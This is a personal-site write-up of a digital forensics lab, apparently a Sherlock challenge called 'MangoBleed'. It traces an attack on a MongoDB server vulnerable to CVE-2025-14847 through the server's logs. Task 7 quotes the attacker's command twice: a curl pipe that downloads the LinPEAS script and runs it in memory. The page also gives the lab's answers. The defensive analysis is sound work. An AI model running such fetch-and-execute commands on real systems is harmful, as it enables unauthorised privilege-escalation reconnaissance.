---
layout: home
title: MangoBleed — Writeup
permalink: /writeups/sherlock/mangobleed/
---

<!-- ─── MANGOBLEED WRITEUP ─── -->
<div class="writeup-root">
  <div class="container-terminal">

    <a href="/sherlock-labs/" class="writeup-back">← Back to Sherlock Labs</a>

    <header class="writeup-header">
      <div class="writeup-badge">// sherlock_writeup</div>
      <h1>MangoBleed — Writeup</h1>
      <div class="writeup-meta">
        <span class="writeup-diff hard">Hard</span>
        <span class="writeup-date">2025</span>
      </div>
    </header>

    <!-- ── Scenario ── -->
    <section class="writeup-section">
      <h2>Scenario</h2>
      <p>MongoBleed is a MongoDB vulnerability affecting vulnerable database servers. This investigation focuses on analyzing MongoDB logs to trace the attacker's exploitation path — from initial compromise through privilege escalation and data exfiltration preparation.</p>
    </section>

    <!-- ── Task 1 ── -->
    <section class="writeup-section">
      <h2>Task 1: CVE Identification</h2>
      <div class="task-question">
        <span class="task-q-label">Question:</span>
        <p>What is the CVE ID designated to the MongoDB vulnerability explained in the scenario?</p>
      </div>
      <div class="task-investigation">
        <p>The scenario references MongoBleed, a MongoDB vulnerability affecting vulnerable database servers. This vulnerability is tracked as <strong>CVE-2025-14847</strong>.</p>
        <p>Knowing the associated CVE helps determine whether the installed MongoDB version is vulnerable and provides context for the observed attacker activity.</p>
      </div>
      <div class="task-answer">
        <span class="answer-label">Answer:</span>
        <code>CVE-2025-14847</code>
      </div>
    </section>

    <!-- ── Task 2 ── -->
    <section class="writeup-section">
      <h2>Task 2: Vulnerable MongoDB Version</h2>
      <div class="task-question">
        <span class="task-q-label">Question:</span>
        <p>What is the version of MongoDB installed on the server that the CVE exploited?</p>
      </div>
      <div class="task-investigation">
        <p>The MongoDB version was identified by examining the MongoDB startup logs. During service initialization, MongoDB records its version information.</p>
        <div class="log-block">
          <span class="log-line">MongoDB starting</span>
          <span class="log-line">Version: 8.0.16</span>
        </div>
        <p>Because version <strong>8.0.16</strong> is vulnerable to the MongoBleed CVE, it confirms that the server was susceptible to exploitation.</p>
      </div>
      <div class="task-answer">
        <span class="answer-label">Answer:</span>
        <code>8.0.16</code>
      </div>
    </section>

    <!-- ── Task 3 ── -->
    <section class="writeup-section">
      <h2>Task 3: Attacker IP Address</h2>
      <div class="task-question">
        <span class="task-q-label">Question:</span>
        <p>Analyze the MongoDB logs to identify the attacker's remote IP address used to exploit the CVE.</p>
      </div>
      <div class="task-investigation">
        <p>The MongoDB logs were reviewed for incoming client connections. Repeated malicious connections originated from a single external IP address:</p>
        <div class="log-block">
          <span class="log-line highlight-ip">65.0.76.43</span>
        </div>
        <p>The unusually high number of connections strongly suggests automated exploitation.</p>
      </div>
      <div class="task-answer">
        <span class="answer-label">Answer:</span>
        <code>65.0.76.43</code>
      </div>
    </section>

    <!-- ── Task 4 ── -->
    <section class="writeup-section">
      <h2>Task 4: Exploitation Start Time</h2>
      <div class="task-question">
        <span class="task-q-label">Question:</span>
        <p>Based on the MongoDB logs, determine the exact date and time the attacker's exploitation activity began.</p>
      </div>
      <div class="task-investigation">
        <p>Reviewing the earliest malicious connection recorded in the MongoDB logs established the beginning of the attack timeline.</p>
        <p>The first confirmed malicious activity occurred at:</p>
        <div class="log-block">
          <span class="log-line highlight-time">2025-12-29 05:25:52</span>
        </div>
        <p>This timestamp marks the initial exploitation of the vulnerable MongoDB service.</p>
      </div>
      <div class="task-answer">
        <span class="answer-label">Answer:</span>
        <code>2025-12-29 05:25:52</code>
      </div>
    </section>

    <!-- ── Task 5 ── -->
    <section class="writeup-section">
      <h2>Task 5: Total Malicious Connections</h2>
      <div class="task-question">
        <span class="task-q-label">Question:</span>
        <p>Using the MongoDB logs, calculate the total number of malicious connections initiated by the attacker.</p>
      </div>
      <div class="task-investigation">
        <p>After identifying the malicious IP address, all connections originating from that address were counted.</p>
        <p>The investigation identified:</p>
        <div class="log-block">
          <span class="log-line highlight-num">75,260</span>
        </div>
        <p>malicious connections. This volume of traffic indicates a highly automated attack rather than manual interaction.</p>
      </div>
      <div class="task-answer">
        <span class="answer-label">Answer:</span>
        <code>75260</code>
      </div>
    </section>

    <!-- ── Task 6 ── -->
    <section class="writeup-section">
      <h2>Task 6: Successful Interactive Access</h2>
      <div class="task-question">
        <span class="task-q-label">Question:</span>
        <p>The attacker gained remote access after a series of brute-force attempts. Based on the logs, when did the attacker successfully gain interactive hands-on remote access?</p>
      </div>
      <div class="task-investigation">
        <p>Authentication logs showed numerous failed login attempts followed by a successful authentication.</p>
        <p>The first confirmed interactive access occurred at:</p>
        <div class="log-block">
          <span class="log-line highlight-time">2025-12-29 05:40:03</span>
        </div>
        <p>This timestamp represents the transition from automated exploitation to hands-on keyboard activity.</p>
      </div>
      <div class="task-answer">
        <span class="answer-label">Answer:</span>
        <code>2025-12-29 05:40:03</code>
      </div>
    </section>

    <!-- ── Task 7 ── -->
    <section class="writeup-section">
      <h2>Task 7: Privilege Escalation Command</h2>
      <div class="task-question">
        <span class="task-q-label">Question:</span>
        <p>Identify the exact command line the attacker used to execute an in-memory script as part of their privilege-escalation attempt.</p>
      </div>
      <div class="task-investigation">
        <p>The attacker's shell history revealed the execution of <strong>LinPEAS</strong>, a widely used Linux privilege escalation enumeration tool.</p>
        <p>Instead of downloading the script to disk, the attacker executed it directly in memory using a pipeline.</p>
        <div class="code-block">
          <pre><code>curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh</code></pre>
        </div>
        <p>Executing the script in memory reduces forensic artifacts while allowing the attacker to enumerate privilege escalation opportunities.</p>
      </div>
      <div class="task-answer">
        <span class="answer-label">Answer:</span>
        <div class="code-block">
          <pre><code>curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh</code></pre>
        </div>
      </div>
    </section>

    <!-- ── Task 8 ── -->
    <section class="writeup-section">
      <h2>Task 8: Target Directory</h2>
      <div class="task-question">
        <span class="task-q-label">Question:</span>
        <p>The attacker was interested in a specific directory and also opened a Python web server, likely for exfiltration purposes. Which directory was the target?</p>
      </div>
      <div class="task-investigation">
        <p>The attacker's activity showed a particular focus on the MongoDB data directory:</p>
        <div class="log-block">
          <span class="log-line highlight-dir">/var/lib/mongodb</span>
        </div>
        <p>This directory stores the MongoDB database files, making it a valuable target for data theft.</p>
        <p>Additionally, the attacker started a Python HTTP server, a technique commonly used to stage or transfer files during post-exploitation.</p>
        <p>Together, these actions strongly suggest preparation for data exfiltration.</p>
      </div>
      <div class="task-answer">
        <span class="answer-label">Answer:</span>
        <code>/var/lib/mongodb</code>
      </div>
    </section>

    <!-- ── Attack Timeline ── -->
    <section class="writeup-section">
      <h2>Attack Timeline</h2>
      <div class="timeline-table-wrap">
        <table class="timeline-table">
          <thead>
            <tr>
              <th>Time (UTC)</th>
              <th>Activity</th>
            </tr>
          </thead>
          <tbody>
            <tr>
              <td><code>2025-12-29 05:25:52</code></td>
              <td>Initial exploitation of the vulnerable MongoDB service</td>
            </tr>
            <tr>
              <td><code>Shortly after</code></td>
              <td>Automated exploitation generated 75,260 malicious connections</td>
            </tr>
            <tr>
              <td><code>2025-12-29 05:40:03</code></td>
              <td>Successful interactive remote access obtained</td>
            </tr>
            <tr>
              <td><code>Post-compromise</code></td>
              <td>LinPEAS executed for privilege escalation reconnaissance</td>
            </tr>
            <tr>
              <td><code>Post-compromise</code></td>
              <td>MongoDB data directory accessed</td>
            </tr>
            <tr>
              <td><code>Post-compromise</code></td>
              <td>Python HTTP server started, indicating possible data staging or exfiltration</td>
            </tr>
          </tbody>
        </table>
      </div>
    </section>

    <!-- ── Footer ── -->
    <footer class="writeup-footer">
      <p>© 2025 Grace Mawia // CYBER_SENTINEL</p>
    </footer>

  </div>
</div>

<style>
/* ─── Writeup Page Styles ─── */
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&family=JetBrains+Mono:wght@400;500;700&display=swap');

.writeup-root {
  width: 100%;
  min-height: 100vh;
  background: linear-gradient(180deg, #07060b, #0f0d1a);
  color: rgba(196, 176, 204, 0.85);
  font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
}

.writeup-root .container-terminal {
  max-width: 840px;
  margin: 0 auto;
  padding: 60px 36px 40px;
}

.writeup-back {
  display: inline-flex;
  align-items: center;
  gap: 6px;
  font-family: 'JetBrains Mono', monospace;
  font-size: 13px;
  color: rgba(201, 160, 220, 0.6);
  text-decoration: none;
  transition: color 0.2s;
  margin-bottom: 32px;
}
.writeup-back:hover {
  color: var(--mauve, #c9a0dc);
}

/* ── Header ── */
.writeup-header {
  margin-bottom: 48px;
}
.writeup-badge {
  font-family: 'JetBrains Mono', monospace;
  font-size: 11px;
  color: var(--mauve, #c9a0dc);
  letter-spacing: 2px;
  text-transform: uppercase;
  margin-bottom: 12px;
  opacity: 0.7;
}
.writeup-header h1 {
  font-size: 2.4rem;
  font-weight: 700;
  color: #e8e0f0;
  margin: 0 0 12px;
  line-height: 1.2;
}
.writeup-meta {
  display: flex;
  gap: 16px;
  align-items: center;
}
.writeup-diff {
  font-family: 'JetBrains Mono', monospace;
  font-size: 11px;
  padding: 3px 12px;
  border-radius: 20px;
  text-transform: uppercase;
  letter-spacing: 0.5px;
}
.writeup-diff.hard {
  background: rgba(255, 107, 107, 0.1);
  color: #ff6b6b;
  border: 1px solid rgba(255, 107, 107, 0.15);
}
.writeup-date {
  font-family: 'JetBrains Mono', monospace;
  font-size: 12px;
  color: rgba(196, 176, 204, 0.4);
}

/* ── Sections ── */
.writeup-section {
  margin-bottom: 40px;
  padding-bottom: 32px;
  border-bottom: 1px solid rgba(201, 160, 220, 0.06);
}
.writeup-section:last-of-type {
  border-bottom: none;
}
.writeup-section h2 {
  font-size: 1.3rem;
  font-weight: 700;
  color: #e0d4ee;
  margin: 0 0 16px;
  font-family: 'JetBrains Mono', monospace;
}

.task-question {
  background: rgba(201, 160, 220, 0.04);
  border-left: 3px solid rgba(201, 160, 220, 0.2);
  padding: 14px 18px;
  border-radius: 0 8px 8px 0;
  margin-bottom: 16px;
}
.task-q-label {
  font-family: 'JetBrains Mono', monospace;
  font-size: 11px;
  color: var(--mauve, #c9a0dc);
  text-transform: uppercase;
  letter-spacing: 1px;
  display: block;
  margin-bottom: 6px;
}
.task-question p {
  margin: 0;
  font-size: 0.95rem;
  line-height: 1.6;
  color: rgba(196, 176, 204, 0.9);
}

.task-investigation {
  margin-bottom: 16px;
  line-height: 1.7;
  font-size: 0.95rem;
}

.task-answer {
  background: rgba(39, 201, 63, 0.04);
  border: 1px solid rgba(39, 201, 63, 0.1);
  border-radius: 8px;
  padding: 14px 18px;
  margin-top: 12px;
}
.answer-label {
  font-family: 'JetBrains Mono', monospace;
  font-size: 11px;
  color: #27c93f;
  text-transform: uppercase;
  letter-spacing: 1px;
  display: block;
  margin-bottom: 6px;
}
.task-answer code {
  font-family: 'JetBrains Mono', monospace;
  font-size: 14px;
  color: #27c93f;
  background: rgba(39, 201, 63, 0.06);
  padding: 4px 12px;
  border-radius: 4px;
  display: inline-block;
  word-break: break-all;
}

.log-block {
  background: rgba(0, 0, 0, 0.3);
  border: 1px solid rgba(201, 160, 220, 0.08);
  border-radius: 6px;
  padding: 12px 16px;
  font-family: 'JetBrains Mono', monospace;
  font-size: 13px;
  margin: 12px 0;
  line-height: 1.6;
}
.log-line {
  display: block;
  color: rgba(196, 176, 204, 0.7);
}
.log-line.highlight-ip {
  color: #ff6b6b;
}
.log-line.highlight-time {
  color: #ffd93d;
}
.log-line.highlight-num {
  color: #6bcbff;
  font-weight: 700;
}
.log-line.highlight-dir {
  color: #c9a0dc;
}

.code-block {
  background: rgba(0, 0, 0, 0.4);
  border: 1px solid rgba(201, 160, 220, 0.08);
  border-radius: 6px;
  padding: 14px 18px;
  margin: 12px 0;
  overflow-x: auto;
}
.code-block pre {
  margin: 0;
  font-family: 'JetBrains Mono', monospace;
  font-size: 13px;
  line-height: 1.6;
  color: rgba(196, 176, 204, 0.85);
  white-space: pre-wrap;
  word-break: break-all;
}
.code-block code {
  background: none;
  padding: 0;
  color: inherit;
}

/* ── Timeline Table ── */
.timeline-table-wrap {
  overflow-x: auto;
  margin: 16px 0;
}
.timeline-table {
  width: 100%;
  border-collapse: collapse;
  font-family: 'JetBrains Mono', monospace;
  font-size: 13px;
}
.timeline-table th {
  text-align: left;
  padding: 10px 14px;
  color: rgba(201, 160, 220, 0.5);
  border-bottom: 1px solid rgba(201, 160, 220, 0.1);
  font-size: 11px;
  text-transform: uppercase;
  letter-spacing: 1px;
}
.timeline-table td {
  padding: 10px 14px;
  border-bottom: 1px solid rgba(201, 160, 220, 0.04);
  color: rgba(196, 176, 204, 0.75);
}
.timeline-table td:first-child {
  white-space: nowrap;
  color: rgba(196, 176, 204, 0.9);
}
.timeline-table tr:hover td {
  background: rgba(201, 160, 220, 0.02);
}

/* ── Footer ── */
.writeup-footer {
  margin-top: 60px;
  padding-top: 24px;
  border-top: 1px solid rgba(201, 160, 220, 0.06);
  text-align: center;
}
.writeup-footer p {
  font-family: 'JetBrains Mono', monospace;
  font-size: 11px;
  color: rgba(196, 176, 204, 0.3);
  letter-spacing: 1px;
  margin: 0;
}

/* ── Responsive ── */
@media (max-width: 720px) {
  .writeup-root .container-terminal {
    padding: 40px 20px;
  }
  .writeup-header h1 {
    font-size: 1.6rem;
  }
  .timeline-table,
  .timeline-table td,
  .timeline-table th {
    font-size: 12px;
  }
  .task-answer code {
    font-size: 12px;
    word-break: break-all;
  }
}
</style>
